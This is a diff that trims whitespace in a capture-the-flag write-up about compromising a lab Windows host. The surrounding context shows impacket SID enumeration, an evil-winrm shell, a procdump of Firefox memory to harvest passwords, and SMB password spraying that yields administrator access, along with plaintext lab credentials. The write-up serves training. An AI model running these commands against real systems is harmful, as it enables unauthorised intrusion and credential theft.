@@ -54,7 +54,7 @@ with that credentials at hand, we can run some enum on the machine now, lets get
 ```text
 __$ lookupsid.py supportdesk/hazard:stealth1agent@10.10.10.149                                                                                                                                                                               
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation                                                                                                                                                                                     
-                                                                                                                                                                                                                                             
+
 [*] Brute forcing SIDs at 10.10.10.149                                                                                                                                                                                                       
 [*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]                                                                                                                                                                                        
 [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112                                                                                                                                                                                 
@@ -89,18 +89,18 @@ we can now simply evil-winrm as this guy now, lets try that
 
 ```text
 evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'                                                                                                                                                                                
-                                                                                                                                                                                                                                             
+
 Evil-WinRM shell v2.4                                                                                                                                                                                                                        
-                                                                                                                                                                                                                                             
+
 Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Chase\Documents> cd ../desktop                                                                                                                                                                                      
 *Evil-WinRM* PS C:\Users\Chase\desktop> ls                                                                                                                                                                                                   
-                                                                                                                                                                                                                                             
-                                                                                                                      
+
+
     Directory: C:\Users\Chase\desktop                                                                                                                                                                                                        
-                                                                                                                                                                                                                                             
-                                                                                                                      
+
+
 Mode                LastWriteTime         Length Name                                                                 
 ----                -------------         ------ ----                                                                                                                                                                                        
 -a----        4/22/2019   9:08 AM            121 todo.txt                                                                                                                                                                                    
@@ -113,7 +113,7 @@ so, lets do a get-process -name firefox and get the process id
 
 ```text
 *Evil-WinRM* PS C:\Users\Chase\Documents> get-process -name firefox                                                   
-                                                                                                                                                                                                                                             
+
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                 
 -------  ------    -----      -----     ------     --  -- -----------                                                 
     355      25    16420     246560       0.17   5996   1 firefox                                                                                                                                                                            
@@ -127,11 +127,11 @@ now, lets dump the process data from memory using procdump \(sysinternals tool\)
 
 ```text
 .\procdump64.exe -accepteula -ma 5996                                                                                                                                                              
-                                                                                                                                                                                                                                             
+
 ProcDump v10.0 - Sysinternals process dump utility                                                                                                                                                                                           
 Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards                                                          
 Sysinternals - www.sysinternals.com                                                                                                                                                                                                          
-                                                                                                                                                                                                                                             
+
 [12:48:39] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_210729_124839.dmp                                                                                                                                                          
 [12:48:39] Dump 1 writing: Estimated dump file size is 298 MB.                                                                                                                                                                               
 [12:48:39] Dump 1 complete: 298 MB written in 0.6 seconds                                                                                                                                                                                    
@@ -174,8 +174,7 @@ SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrato
 SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:$uperP@ssword STATUS_LOGON_FAILURE                                                                                                                         
 SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE                                                                                                                      
 SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\administrator:4dD!5}x/re8]FBuZ (Pwn3d!)                                                                                                                                  
-SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
-
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE
 ```
 
 and smbmap shows us that this guy has WRITE access on the C$ and ADMIN$ shares,
